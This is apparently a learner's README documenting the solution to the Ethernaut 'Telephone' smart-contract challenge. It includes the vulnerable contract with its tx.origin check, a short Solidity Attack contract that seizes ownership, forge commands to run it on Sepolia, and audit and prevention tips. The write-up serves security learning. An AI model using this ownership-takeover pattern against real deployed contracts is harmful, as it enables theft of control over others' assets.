# Ethernaut Level: Telephone - Smart Contract Auditing Journey

## Introduction
Hello! In this repository, I've solved the **Telephone** level as part of my Ethernaut challenges. I'm learning smart contract auditing by solving one level per day, and this folder (`levels/telephone/`) contains everything related to it.

**Goal:** Change the contract owner by exploiting the `changeOwner` function.  
**Tools:** Foundry (for scripting and testing), Sepolia testnet.  
**Solved Date:** October 18, 2025 (Day 5).  
**Success:** Verified on the Ethernaut site!

## Contract Overview
This contract has a simple ownership mechanism with a constructor setting the initial owner. The `changeOwner(address _owner)` function allows ownership transfer, but only if `tx.origin != msg.sender`—intended to prevent contract calls, but ironically exploitable by them.

**Key Code Snippet (from src/Telephone.sol):**
```solidity
contract Telephone {
    address public owner;

    constructor() {
        owner = msg.sender;
    }

    function changeOwner(address _owner) public {
        if (tx.origin != msg.sender) {  // Vulnerable check!
            owner = _owner;
        }
    }
}
```

## Vulnerability Analysis
**Main Issue: tx.origin vs. msg.sender Confusion**  
- `tx.origin` is the original EOA (Externally Owned Account) starting the transaction, while `msg.sender` is the immediate caller (could be a contract). The check `tx.origin != msg.sender` allows contracts to call and change owner (since msg.sender = attack contract, tx.origin = EOA), but blocks EOAs. This is backwards—it's meant to restrict contracts but enables the exploit.  
- **Security Impact:** Unauthorized ownership takeover, allowing control over sensitive functions. In audits, this highlights the dangers of tx.origin (deprecated for security reasons) over msg.sender for authorization.  
- **Audit Tip:** Never use tx.origin—it's manipulable by proxies. Stick to msg.sender with signatures or roles (e.g., OpenZeppelin's Ownable). Scan for origin checks with tools like Slither.

**Example:** EOA calls Attack contract, which calls changeOwner. tx.origin = EOA, msg.sender = Attack → check passes, owner changes.

## Solution Steps
The attack: Deploy an "Attack" contract that calls `changeOwner` on the target. When EOA deploys/calls Attack, tx.origin remains EOA, but msg.sender becomes Attack, passing the check.

1. **Setup:** Create Foundry project, set target instance address in script.
2. **Run Attack:** `forge script script/TelephoneSolution.s.sol --rpc-url $SEPOLIA_RPC_URL --broadcast`.
3. **Verify:** Check `owner()` matches your address, submit on Ethernaut site.

**Key Attack Code Snippet (from src/Attack.sol):**
```solidity
contract Attack {
    Telephone public telephone;

    constructor(Telephone _telephone) public {
        telephone = _telephone;
    }

    function attack(address _newOwner) public {
        telephone.changeOwner(_newOwner);  // msg.sender = Attack, tx.origin = EOA → Passes check!
    }
}
```

## Test and Output
- **Local Test:** Run `anvil` and `forge test`—simulates ownership change via Attack deployment and call.
- **Testnet Output Example:** Console log: "Before attack, Owner: 0xOriginal...", "After attack, Owner: 0xYourAddress".

## Key Learnings
- **Auditing Skill:** Flag tx.origin usage—it's a red flag for authorization flaws; prefer msg.sender + checks.
- **EVM Concept:** tx.origin tracks the transaction root (EOA), msg.sender the stack (contracts). Useful for multi-hop but insecure.
- **Prevention:** Use msg.sender == owner for access control; add reentrancy guards if needed.
- **Next Step:** Extend the script to verify ownership post-attack with a view call.

## Installation & Run
1. Install Foundry: `curl -L https://foundry.paradigm.xyz | bash`.
2. `cd levels/telephone`.
3. Set `.env`: `PRIVATE_KEY=your_key` and `SEPOLIA_RPC_URL=your_rpc`.
4. Run script: `forge script script/TelephoneSolution.s.sol --rpc-url $SEPOLIA_RPC_URL --broadcast -vvvv`.

If you have questions, comment on the issue or mention me on X (@0xZHD_X)! Next level: `Token`. 🚀

---

**License:** MIT  
**Author:** [0xZHD] - Smart Contract Auditor Learner  
**X:** [Zahedul I Sadik](@0xZHD_X)  
**References:** [Ethernaut Docs](https://ethernaut.openzeppelin.com/)